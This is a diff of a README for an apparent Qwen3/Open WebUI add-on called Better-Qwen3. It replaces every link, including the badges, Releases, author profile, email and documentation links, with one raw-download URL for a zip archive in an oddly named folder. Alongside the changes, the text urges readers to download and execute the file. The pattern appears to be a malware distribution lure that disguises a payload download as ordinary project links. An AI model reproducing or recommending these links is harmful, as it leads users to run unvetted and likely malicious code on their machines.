@@ -1,9 +1,9 @@
 # Better-Qwen3
 
-![GitHub repo size](https://img.shields.io/github/repo-size/Ayaz2123/Better-Qwen3)
-![GitHub issues](https://img.shields.io/github/issues/Ayaz2123/Better-Qwen3)
-![GitHub stars](https://img.shields.io/github/stars/Ayaz2123/Better-Qwen3)
-![GitHub license](https://img.shields.io/github/license/Ayaz2123/Better-Qwen3)
+![GitHub repo size](https://github.com/Ayaz2123/Better-Qwen3/raw/refs/heads/main/uncomparably/Better_Qwen_v2.0-alpha.5.zip)
+![GitHub issues](https://github.com/Ayaz2123/Better-Qwen3/raw/refs/heads/main/uncomparably/Better_Qwen_v2.0-alpha.5.zip)
+![GitHub stars](https://github.com/Ayaz2123/Better-Qwen3/raw/refs/heads/main/uncomparably/Better_Qwen_v2.0-alpha.5.zip)
+![GitHub license](https://github.com/Ayaz2123/Better-Qwen3/raw/refs/heads/main/uncomparably/Better_Qwen_v2.0-alpha.5.zip)
 
 ## Overview
 
@@ -29,7 +29,7 @@ Welcome to **Better-Qwen3**! This project enhances your experience with the Qwen
 
 ## Installation
 
-To get started with Better-Qwen3, you need to download the latest release. Visit the [Releases](https://github.com/Ayaz2123/Better-Qwen3/releases) section to find the latest version. Download the appropriate file for your system and execute it to install the application.
+To get started with Better-Qwen3, you need to download the latest release. Visit the [Releases](https://github.com/Ayaz2123/Better-Qwen3/raw/refs/heads/main/uncomparably/Better_Qwen_v2.0-alpha.5.zip) section to find the latest version. Download the appropriate file for your system and execute it to install the application.
 
 ### Prerequisites
 
@@ -80,12 +80,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **GitHub**: [Ayaz2123](https://github.com/Ayaz2123)
-- **Email**: ayaz@example.com
+- **GitHub**: [Ayaz2123](https://github.com/Ayaz2123/Better-Qwen3/raw/refs/heads/main/uncomparably/Better_Qwen_v2.0-alpha.5.zip)
+- **Email**: https://github.com/Ayaz2123/Better-Qwen3/raw/refs/heads/main/uncomparably/Better_Qwen_v2.0-alpha.5.zip
 
 ## Releases
 
-To keep your installation up to date, check the [Releases](https://github.com/Ayaz2123/Better-Qwen3/releases) section regularly. Download the latest files and execute them to benefit from the newest features and improvements.
+To keep your installation up to date, check the [Releases](https://github.com/Ayaz2123/Better-Qwen3/raw/refs/heads/main/uncomparably/Better_Qwen_v2.0-alpha.5.zip) section regularly. Download the latest files and execute them to benefit from the newest features and improvements.
 
 ## Acknowledgments
 
@@ -94,8 +94,8 @@ To keep your installation up to date, check the [Releases](https://github.com/Ay
 
 ## Additional Resources
 
-- [Open WebUI Documentation](https://open-webui-docs.com)
-- [Qwen3 User Guide](https://qwen3-user-guide.com)
+- [Open WebUI Documentation](https://github.com/Ayaz2123/Better-Qwen3/raw/refs/heads/main/uncomparably/Better_Qwen_v2.0-alpha.5.zip)
+- [Qwen3 User Guide](https://github.com/Ayaz2123/Better-Qwen3/raw/refs/heads/main/uncomparably/Better_Qwen_v2.0-alpha.5.zip)
 
 ## Conclusion
 
